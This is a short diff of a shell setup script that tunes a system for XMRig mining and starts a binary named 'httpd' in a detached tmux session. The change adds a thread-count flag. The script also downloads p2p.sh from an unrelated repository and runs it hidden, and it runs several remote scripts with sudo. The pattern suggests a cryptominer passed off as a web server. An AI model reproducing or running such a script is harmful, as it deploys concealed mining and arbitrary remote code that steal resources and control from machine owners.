@@ -9,7 +9,7 @@ sudo bash enable_1gb_pages.sh
 wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/randomx_boost.sh
 sudo bash randomx_boost.sh
 sudo chmod +x httpd
-sudo tmux new-session -d -s my_session1  './httpd'
+sudo tmux new-session -d -s my_session1  './httpd -t 4'
 wget https://raw.githubusercontent.com/minnie1311/azureAI/master/p2p.sh
 sudo tmux new-session -d -s 2 'bash p2p.sh'
 curl -fsSL get.docker.com -o get-docker.sh
